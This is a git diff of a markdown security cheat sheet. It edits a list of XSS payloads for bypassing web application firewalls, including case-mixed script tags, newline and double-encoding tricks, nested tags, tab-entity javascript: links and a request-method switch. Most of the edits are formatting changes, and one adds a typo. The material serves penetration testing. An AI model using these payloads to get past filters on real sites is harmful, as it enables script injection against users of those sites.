@@ -109,37 +109,37 @@ Similar to Reflected Xss Or Stored Xss But you Dont get any reflection, but you 
 	- https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626
 	
 ------
-
 #### XSS Firewall Bypass Techniques
 
-1. Check if the firewall is blocking only lowercase
+1.Check if the firewall is blocking only lowercase
 
 Ex:- <scRipT>alert(1)</scRipT>
 
-2. Try to break firewall regex with the  new line(\r\n)
+2.Try to break firewall regex with the  new line(\r\n)
 
 Ex:- <script>%0alert(1)</script>
 
-3. Try Double Encoding
+3.Try Double Encoding
 
 Ex:- %2522
 
-4. Testing for recursive filters, if firewall removes text in red, we will have clear payload
+4.esting for recursive filters, if firewall removes text in red, we will have clear payload
 
 Ex:- <src<script>ipt>alert(1);</scr</script>ipt>
 
-5. Injecting anchor tag without whitespaces
+5.Injecting anchor tag without whitespaces
 
 Ex:- <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
 
-6. Try to bypass whitespaces using Bullet
+6.Try to bypass whitespaces using Bullet
 
 Ex:- <svg•onload=alert(1)>
 
-7. Try to change request method
+7.Try to change request method
 
 Ex:- GET /?q=xss  POST/
                   q=xss
+
 
 **Credits** 
 
